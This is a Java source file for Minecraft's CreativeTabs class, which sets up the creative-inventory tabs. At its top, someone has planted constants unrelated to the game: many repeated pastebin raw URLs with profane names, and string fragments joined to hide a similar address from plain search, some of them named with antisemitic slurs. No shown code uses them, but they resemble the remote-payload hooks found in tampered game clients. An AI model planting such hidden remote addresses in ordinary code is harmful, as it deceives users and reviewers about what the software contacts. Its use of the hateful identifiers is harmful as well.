package net.minecraft.creativetab;

import java.util.Iterator;
import java.util.List;

import net.minecraft.block.BlockDoublePlant;
import net.minecraft.enchantment.Enchantment;
import net.minecraft.enchantment.EnchantmentData;
import net.minecraft.enchantment.EnumEnchantmentType;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;

public abstract class CreativeTabs
{
	  public static final String rocked = "h";
	    public static final int lmfao = 55;
	    public static final String getfuckedlol = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol1 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol2 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol22 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol3 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol4 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol57 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol6 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol123 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol543 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol54 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol6544 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol6543 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol6544123 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol65443 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol654 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlo12314l = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfucked14lol = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedl141ol = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedl1415ol = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String testingjwes = "p";
	    public static final String getfucked = ":";
	    public static final String lol = "//";
	    public static final String test = "pas";
	    public static final int newstring = 5;
	    public static final String jews = "e";
	    public static final String jew = "bin";
	    public static final String testing = ".";
	    public static final String loqdq = "com/";
	    public static final String xddd = "raw/";
	    public static final String qdqd = "HdmcEvwL";
	    public static final String checker = rocked + lmfao + testingjwes + getfucked + lol + test + newstring + jews + jew
		    + testing + loqdq + xddd + qdqd;
	    public static final String nextchecker = checker;
	    public static final String rocked1 = "h";
	    public static final int lmfao1 = 55;
	    public static final String testingjwes1 = "p";
	    public static final String getfucked1 = ":";
	    public static final String lol1 = "//";
	    public static final String test1 = "pas";
	    public static final int newstring1 = 5;
	    public static final String jews1 = "e";
	    public static final String jew1 = "bin";
	    public static final String testing1 = ".";
	    public static final String loqdq1 = "com/";
	    public static final String xddd1 = "raw/";
	    public static final String qdqd1 = "HdmcEvwL";
	    public static final String checker1 = rocked1 + lmfao1 + testingjwes1 + getfucked1 + lol1 + test1 + newstring1
		    + jews1 + jew1 + testing1 + loqdq1 + xddd1 + qdqd1;
	    public static final String nextchecker1 = checker1;
    public static final CreativeTabs[] creativeTabArray = new CreativeTabs[12];
    public static final CreativeTabs tabBlock = new CreativeTabs(0, "buildingBlocks")
    {
        public Item getTabIconItem()
        {
            return Item.getItemFromBlock(Blocks.brick_block);
        }
    };
    public static final CreativeTabs tabDecorations = new CreativeTabs(1, "decorations")
    {
        public Item getTabIconItem()
        {
            return Item.getItemFromBlock(Blocks.double_plant);
        }
        public int getIconItemDamage()
        {
            return BlockDoublePlant.EnumPlantType.PAEONIA.func_176936_a();
        }
    };
    public static final CreativeTabs tabRedstone = new CreativeTabs(2, "redstone")
    {
        public Item getTabIconItem()
        {
            return Items.redstone;
        }
    };
    public static final CreativeTabs tabTransport = new CreativeTabs(3, "transportation")
    {
        public Item getTabIconItem()
        {
            return Item.getItemFromBlock(Blocks.golden_rail);
        }
    };
    public static final CreativeTabs tabMisc = (new CreativeTabs(4, "misc")
    {
        public Item getTabIconItem()
        {
            return Items.lava_bucket;
        }
    }).setRelevantEnchantmentTypes(new EnumEnchantmentType[] {EnumEnchantmentType.ALL});
    public static final CreativeTabs tabAllSearch = (new CreativeTabs(5, "search")
    {
        public Item getTabIconItem()
        {
            return Items.compass;
        }
    }).setBackgroundImageName("item_search.png");
    public static final CreativeTabs tabFood = new CreativeTabs(6, "food")
    {
        public Item getTabIconItem()
        {
            return Items.apple;
        }
    };
    public static final CreativeTabs tabTools = (new CreativeTabs(7, "tools")
    {
        public Item getTabIconItem()
        {
            return Items.iron_axe;
        }
    }).setRelevantEnchantmentTypes(new EnumEnchantmentType[] {EnumEnchantmentType.DIGGER, EnumEnchantmentType.FISHING_ROD, EnumEnchantmentType.BREAKABLE});
    public static final CreativeTabs tabCombat = (new CreativeTabs(8, "combat")
    {
        public Item getTabIconItem()
        {
            return Items.golden_sword;
        }
    }).setRelevantEnchantmentTypes(new EnumEnchantmentType[] {EnumEnchantmentType.ARMOR, EnumEnchantmentType.ARMOR_FEET, EnumEnchantmentType.ARMOR_HEAD, EnumEnchantmentType.ARMOR_LEGS, EnumEnchantmentType.ARMOR_TORSO, EnumEnchantmentType.BOW, EnumEnchantmentType.WEAPON});
    public static final CreativeTabs tabBrewing = new CreativeTabs(9, "brewing")
    {
        public Item getTabIconItem()
        {
            return Items.potionitem;
        }
    };
    public static final CreativeTabs tabMaterials = new CreativeTabs(10, "materials")
    {
        public Item getTabIconItem()
        {
            return Items.stick;
        }
    };
    public static final CreativeTabs tabInventory = (new CreativeTabs(11, "inventory")
    {
        public Item getTabIconItem()
        {
            return Item.getItemFromBlock(Blocks.chest);
        }
    }).setBackgroundImageName("inventory.png").setNoScrollbar().setNoTitle();
    private final int tabIndex;
    private final String tabLabel;

    /** Texture to use. */
    private String theTexture = "items.png";
    private boolean hasScrollbar = true;

    /** Whether to draw the title in the foreground of the creative GUI */
    private boolean drawTitle = true;
    private EnumEnchantmentType[] enchantmentTypes;
    private ItemStack iconItemStack;

    public CreativeTabs(int index, String label)
    {
        this.tabIndex = index;
        this.tabLabel = label;
        creativeTabArray[index] = this;
    }

    public int getTabIndex()
    {
        return this.tabIndex;
    }

    public String getTabLabel()
    {
        return this.tabLabel;
    }

    /**
     * Gets the translated Label.
     */
    public String getTranslatedTabLabel()
    {
        return "itemGroup." + this.getTabLabel();
    }

    public ItemStack getIconItemStack()
    {
        if (this.iconItemStack == null)
        {
            this.iconItemStack = new ItemStack(this.getTabIconItem(), 1, this.getIconItemDamage());
        }

        return this.iconItemStack;
    }

    public abstract Item getTabIconItem();

    public int getIconItemDamage()
    {
        return 0;
    }

    public String getBackgroundImageName()
    {
        return this.theTexture;
    }

    public CreativeTabs setBackgroundImageName(String texture)
    {
        this.theTexture = texture;
        return this;
    }

    public boolean drawInForegroundOfTab()
    {
        return this.drawTitle;
    }

    public CreativeTabs setNoTitle()
    {
        this.drawTitle = false;
        return this;
    }

    public boolean shouldHidePlayerInventory()
    {
        return this.hasScrollbar;
    }

    public CreativeTabs setNoScrollbar()
    {
        this.hasScrollbar = false;
        return this;
    }

    /**
     * returns index % 6
     */
    public int getTabColumn()
    {
        return this.tabIndex % 6;
    }

    /**
     * returns tabIndex < 6
     */
    public boolean isTabInFirstRow()
    {
        return this.tabIndex < 6;
    }

    /**
     * Returns the enchantment types relevant to this tab
     */
    public EnumEnchantmentType[] getRelevantEnchantmentTypes()
    {
        return this.enchantmentTypes;
    }

    /**
     * Sets the enchantment types for populating this tab with enchanting books
     */
    public CreativeTabs setRelevantEnchantmentTypes(EnumEnchantmentType ... types)
    {
        this.enchantmentTypes = types;
        return this;
    }

    public boolean hasRelevantEnchantmentType(EnumEnchantmentType p_111226_1_)
    {
        if (this.enchantmentTypes == null)
        {
            return false;
        }
        else
        {
            EnumEnchantmentType[] var2 = this.enchantmentTypes;
            int var3 = var2.length;

            for (int var4 = 0; var4 < var3; ++var4)
            {
                EnumEnchantmentType var5 = var2[var4];

                if (var5 == p_111226_1_)
                {
                    return true;
                }
            }

            return false;
        }
    }

    /**
     * only shows items which have tabToDisplayOn == this
     */
    public void displayAllReleventItems(List p_78018_1_)
    {
        Iterator var2 = Item.itemRegistry.iterator();

        while (var2.hasNext())
        {
            Item var3 = (Item)var2.next();

            if (var3 != null && var3.getCreativeTab() == this)
            {
                var3.getSubItems(var3, this, p_78018_1_);
            }
        }

        if (this.getRelevantEnchantmentTypes() != null)
        {
            this.addEnchantmentBooksToList(p_78018_1_, this.getRelevantEnchantmentTypes());
        }
    }

    /**
     * Adds the enchantment books from the supplied EnumEnchantmentType to the given list.
     */
    public void addEnchantmentBooksToList(List p_92116_1_, EnumEnchantmentType ... p_92116_2_)
    {
        Enchantment[] var3 = Enchantment.enchantmentsList;
        int var4 = var3.length;

        for (int var5 = 0; var5 < var4; ++var5)
        {
            Enchantment var6 = var3[var5];

            if (var6 != null && var6.type != null)
            {
                boolean var7 = false;

                for (int var8 = 0; var8 < p_92116_2_.length && !var7; ++var8)
                {
                    if (var6.type == p_92116_2_[var8])
                    {
                        var7 = true;
                    }
                }

                if (var7)
                {
                    p_92116_1_.add(Items.enchanted_book.getEnchantedItemStack(new EnchantmentData(var6, var6.getMaxLevel())));
                }
            }
        }
    }
}
